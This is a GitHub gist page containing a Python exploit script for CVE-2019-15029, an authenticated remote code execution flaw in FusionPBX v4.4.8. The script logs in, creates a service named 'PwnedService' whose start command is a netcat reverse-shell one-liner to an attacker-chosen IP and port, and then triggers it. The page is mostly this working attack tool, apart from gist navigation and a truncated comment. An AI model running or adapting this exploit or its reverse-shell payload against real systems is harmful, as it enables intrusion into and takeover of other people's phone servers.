  Clone this repository at &lt;script src=&quot;https://gist.github.com/mhaskar/7a6a804cd68c7fec4f9d1f5c3507900f.js&quot;&gt;&lt;/script&gt;
* Save mhaskar/7a6a804cd68c7fec4f9d1f5c3507900f to your computer and use it in GitHub Desktop.

[Code](/mhaskar/7a6a804cd68c7fec4f9d1f5c3507900f)
[Revisions
3](/mhaskar/7a6a804cd68c7fec4f9d1f5c3507900f/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/mhaskar/7a6a804cd68c7fec4f9d1f5c3507900f.js&quot;&gt;&lt;/script&gt;

Save mhaskar/7a6a804cd68c7fec4f9d1f5c3507900f to your computer and use it in GitHub Desktop.

[Download ZIP](/mhaskar/7a6a804cd68c7fec4f9d1f5c3507900f/archive/c9b225952e4c52ee96ddf1dcf73afe16e073c3cf.zip)

 [Raw](/mhaskar/7a6a804cd68c7fec4f9d1f5c3507900f/raw/c9b225952e4c52ee96ddf1dcf73afe16e073c3cf/FusionPBX-exploit.py)

[**FusionPBX-exploit.py**](#file-fusionpbx-exploit-py)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | #!/usr/bin/python3 |
| --- | --- |
|  |  |
|  | ''' |
|  | # Exploit Title: FusionPBX v4.4.8 authenticated Remote Code Execution |
|  | # Date: 13/08/2019 |
|  | # Exploit Author: Askar (@mohammadaskar2) |
|  | # CVE : 2019-15029 |
|  | # Vendor Homepage: https://www.fusionpbx.com |
|  | # Software link: https://www.fusionpbx.com/download |
|  | # Version: v4.4.8 |
|  | # Tested on: Ubuntu 18.04 / PHP 7.2 |
|  | ''' |
|  |  |
|  | import requests |
|  | from requests.packages.urllib3.exceptions import InsecureRequestWarning |
|  | import sys |
|  | import warnings |
|  | from bs4 import BeautifulSoup |
|  |  |
|  | # turn off BeautifulSoup and requests warnings |
|  | warnings.filterwarnings("ignore", category=UserWarning, module='bs4') |
|  | requests.packages.urllib3.disable\_warnings(InsecureRequestWarning) |
|  |  |
|  | if len(sys.argv) != 6: |
|  | print(len(sys.argv)) |
|  | print("[~] Usage : ./FusionPBX-exploit.py url username password ip port") |
|  | print("[~] ./exploit.py http://example.com admin p@$$word 172.0.1.3 1337") |
|  |  |
|  | exit() |
|  |  |
|  | url = sys.argv[1] |
|  | username = sys.argv[2] |
|  | password = sys.argv[3] |
|  | ip = sys.argv[4] |
|  | port = sys.argv[5] |
|  |  |
|  |  |
|  | request = requests.session() |
|  |  |
|  | login\_info = { |
|  | "username": username, |
|  | "password": password |
|  | } |
|  |  |
|  | login\_request = request.post( |
|  | url+"/core/user\_settings/user\_dashboard.php", |
|  | login\_info, verify=False |
|  | ) |
|  |  |
|  |  |
|  | if "Invalid Username and/or Password" not in login\_request.text: |
|  | print("[+] Logged In Sucssfully") |
|  | else: |
|  | print("[+] Error with creds") |
|  |  |
|  | service\_edit\_page = url + "/app/services/service\_edit.php" |
|  | services\_page = url + "/app/services/services.php" |
|  | payload\_info = { |
|  | # the service name you want to create |
|  | "service\_name":"PwnedService", |
|  | "service\_type":"pid", |
|  | "service\_data":"1", |
|  |  |
|  | # this value contains the payload , you can change it as you want |
|  | "service\_cmd\_start":"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.0.1.3 1337 >/tmp/f", |
|  | "service\_cmd\_stop":"stop", |
|  | "service\_description":"desc", |
|  | "submit":"Save" |
|  | } |
|  |  |
|  | request.post(service\_edit\_page, payload\_info, verify=False) |
|  | html\_page = request.get(services\_page, verify=False) |
|  |  |
|  | soup = BeautifulSoup(html\_page.text, "lxml") |
|  |  |
|  | for a in soup.find\_all(href=True): |
|  | if "PwnedService" in a: |
|  | sid = a["href"].split("=")[1] |
|  | break |
|  |  |
|  | service\_page = url + "/app/services/services.php?id=" + sid + "&a=start" |
|  | print("[+] Triggering the exploit , check your netcat !") |
|  | request.get(service\_page, verify=False) |

[![@belal2019](https://avatars.githubusercontent.com/u/54771830?s=80&v=4)](/belal2019)

Copy link

### **[belal2019](/belal2019)** commented [Jun 15, 2020](/mhaskar/7a6a804cd68c7fec4f9d1f5c3507900f?permalink_comment_id=3341598#gistcomment-3341598)

Could you contact me on your

Sorry, something went wrong.

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fmhaskar%2F7a6a804cd68c7fec4f9d1f5c3507900f)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


